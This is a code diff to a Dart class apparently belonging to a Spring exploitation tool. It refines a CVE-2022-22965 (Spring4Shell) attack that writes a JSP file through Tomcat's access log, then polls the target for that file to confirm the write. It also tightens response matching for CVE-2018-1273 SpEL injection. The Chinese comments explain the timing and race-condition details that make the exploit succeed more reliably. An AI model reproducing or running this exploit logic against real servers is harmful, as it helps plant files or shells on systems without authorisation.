@@ -87,7 +87,9 @@ class SpringExpService {
         'Content-Type': 'application/x-www-form-urlencoded',
         'Origin': '${baseUri.scheme}://${baseUri.host}${baseUri.hasPort ? ':${baseUri.port}' : ''}',
         'Referer': '${baseUri}users?page=0&size=5',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        // 不要 Accept: text/html —— Spring 会返回 Whitelabel 页面，丢失
+        // "Invalid property" 等错误信息；请求 JSON 才能拿到可判定的报文。
+        'Accept': 'application/json, text/plain, */*',
       },
       body: body,
     ).timeout(timeout);
@@ -192,18 +194,29 @@ class SpringExpService {
         'c2': '<%',
         'DNT': '1',
       }).timeout(timeout);
-      await Future.delayed(const Duration(seconds: 1));
-      http.Response verify = await http
-          .get(Uri.parse('${baseUri}$shellName?k=m4x'))
-          .timeout(timeout);
-      if (verify.statusCode == 401 || verify.statusCode == 403) {
-        verify = await http.get(
-          Uri.parse('${baseUri}$shellName?k=m4x'),
-          headers: {'Authorization': _buildAuthHeader()},
-        ).timeout(timeout);
-      }
-      if (verify.statusCode == 200 && verify.body.contains(marker)) {
-        return ExpResult(true, 'CVE-2022-22965 (Spring4Shell)', '可利用：成功写入并回显验证文件 $shellName');
+      // Tomcat 的 AccessLogValve 要等下一次请求被记录才真正落盘，且 JSP 首次编译
+      // 与文件追加存在竞争；刚启动的实例尤其慢。先发一个无意义请求触发一次日志，
+      // 再轮询（最多约 20 秒）。
+      await http.get(baseUri).timeout(timeout);
+      for (var attempt = 0; attempt < 8; attempt++) {
+        await Future<void>.delayed(Duration(seconds: attempt == 0 ? 3 : 2));
+        var verify = await http
+            .get(Uri.parse('${baseUri}$shellName?k=m4x'))
+            .timeout(timeout);
+        if (verify.statusCode == 401 || verify.statusCode == 403) {
+          verify = await http.get(
+            Uri.parse('${baseUri}$shellName?k=m4x'),
+            headers: {'Authorization': _buildAuthHeader()},
+          ).timeout(timeout);
+        }
+        if (verify.statusCode == 200 && verify.body.contains(marker)) {
+          return ExpResult(
+            true,
+            'CVE-2022-22965 (Spring4Shell)',
+            '可利用：成功写入并回显验证文件 $shellName',
+          );
+        }
+        if (verify.statusCode == 404) continue;
       }
     } catch (e) {
       return ExpResult.probeFailed('CVE-2022-22965 (Spring4Shell)', '探测失败: $e');
@@ -219,31 +232,25 @@ class SpringExpService {
       final res = await _postSpringDataCommonsForm(payload);
 
       final lower = res.body.toLowerCase();
-      final indicators = <String>[
+      // 只认强特征：SpEL 求值痕迹，或 Data Commons 绑定失败时暴露的
+      // "Invalid property 'username'"（vulhub README 的典型回包）。
+      // 旧实现把 "Whitelabel Error Page" / "mappingexception" 也当命中，
+      // 任何 Spring 应用的 500 都会误报。
+      final spelIndicators = <String>[
         'spel',
         'spelEvalException'.toLowerCase(),
         'el100',
         'org.springframework.expression',
-        'org.springframework.data.mapping',
-        'mappingexception',
       ];
-      final hasProxyBindingError =
-          lower.contains('invalid property \'username\'') &&
-          lower.contains('example.users.web.\$proxy');
-      final hasWhitelabel500 =
-          res.statusCode >= 500 &&
-          lower.contains('whitelabel error page') &&
-          lower.contains('this application has no explicit mapping for /error');
-      final hasSpelFeature = indicators.any(lower.contains);
-      if (hasSpelFeature || hasProxyBindingError || hasWhitelabel500) {
+      final hasSpelFeature = spelIndicators.any(lower.contains);
+      final hasProxyBindingError = lower.contains("invalid property 'username'");
+      if (hasSpelFeature || hasProxyBindingError) {
         return ExpResult(
           true,
           'CVE-2018-1273',
           hasProxyBindingError
-              ? '命中 vulhub README 典型回包（Invalid property username + \$Proxy，HTTP ${res.statusCode}），该漏洞通常为盲打执行'
-              : hasWhitelabel500
-                  ? '命中 vulhub 常见错误页特征（HTTP ${res.statusCode} + Whitelabel Error Page），疑似已触发绑定/表达式链路'
-              : 'Spring Data Commons 请求返回 SpEL/数据绑定异常特征（状态 ${res.statusCode}）',
+              ? '命中 Data Commons 绑定异常（Invalid property username，HTTP ${res.statusCode}），该漏洞通常为盲打执行'
+              : '响应含 SpEL 求值特征（HTTP ${res.statusCode}）',
         );
       }
       final location = res.headers['location'] ?? '';
